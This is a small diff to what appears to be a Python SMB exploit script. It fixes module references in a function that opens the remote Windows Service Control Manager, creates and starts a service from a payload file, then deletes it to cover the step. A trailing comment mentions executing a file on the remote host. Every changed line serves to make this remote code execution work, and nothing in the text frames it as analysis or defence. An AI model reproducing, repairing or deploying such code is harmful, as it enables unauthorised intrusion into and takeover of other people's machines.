@@ -1170,10 +1170,10 @@ def do_system_mysmb_session(conn, pipe_name, share, mode, payload_file):
         return
     smbConn.setTimeout(10000)
     scmr.bind(scmr_.MSRPC_UUID_SCMR)
-    resp = scmr.hROpenSCManagerW(scmr)
+    resp = scmr_.hROpenSCManagerW(scmr)
     scHandle = resp["lpScHandle"]
 
-    res = scmr.hRCreateServiceW(
+    res = scmr_.hRCreateServiceW(
         scmr,
         scHandle,
         service_name + "\x00",
@@ -1188,9 +1188,9 @@ def do_system_mysmb_session(conn, pipe_name, share, mode, payload_file):
         scmr.hRStartServiceW(scmr, service)
     except Exception as e:
         print("[-] Failed to start service: %s" % str(e))
-    scmr.hRDeleteService(scmr, service)
-    scmr.hRCloseServiceHandle(scmr, service)
-    scmr.hRCloseServiceHandle(scmr, scHandle)
+    scmr_.hRDeleteService(scmr, service)
+    scmr_.hRCloseServiceHandle(scmr, service)
+    scmr_.hRCloseServiceHandle(scmr, scHandle)
     print('done.')
 
     # example of executing a file on the remote host
